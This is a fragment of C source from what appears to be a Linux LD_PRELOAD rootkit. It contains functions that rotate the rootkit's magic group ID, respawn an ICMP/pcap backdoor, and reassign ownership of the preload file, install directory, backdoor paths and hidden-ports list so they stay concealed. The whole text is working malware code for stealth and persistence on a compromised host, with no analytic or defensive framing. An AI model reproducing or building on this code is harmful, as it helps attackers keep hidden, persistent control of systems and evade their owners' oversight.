void hidedircontents(const char *path, gid_t newgid){
    hook(COPENDIR, CREADDIR);

    DIR *dp = call(COPENDIR, path);
    if(dp == NULL) return;

    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char tmp[strlen(path)+strlen(dir->d_name)+3];
        snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
        chown_path(tmp, newgid);
    }
    closedir(dp);
    chown_path(path, newgid);
}

gid_t changerkgid(void){
    FILE *fp;
    gid_t newgid=0;
    char buf[16];
#ifdef USE_ICMP_BD
    gid_t oldgid=readgid();
#endif

    hook(CFOPEN, CFWRITE, CCHMOD);

    srand(time(NULL));
    while(gidtaken(newgid))
        newgid = (gid_t)(rand() % (MAX_GID - MIN_GID + 1)) + MIN_GID;

    fp = call(CFOPEN, GID_PATH, "w");
    if(fp == NULL)
        return MAGIC_GID;
    snprintf(buf, sizeof(buf), "%u", newgid);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fclose(fp);

#ifdef USE_ICMP_BD
    /* kill&respawn the pcap door */
    killrkprocs(oldgid-1);
    spawnpdoor();
#endif

    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    chown_path(preloadpath, newgid);
    hidedircontents(INSTALL_DIR, newgid);
    hidedircontents(HOMEDIR, newgid);

    for(int i = 0; i != BDVPATHS_SIZE; i++)
        chown_path(bdvpaths[i], newgid);

#ifdef HIDE_PORTS
    chown_path(HIDEPORTS, newgid);
#endif
#ifdef HIDE_MY_ASS
    hidemyass();
#endif

    writenewtime(GIDTIME_PATH, time(NULL));
    return newgid;
}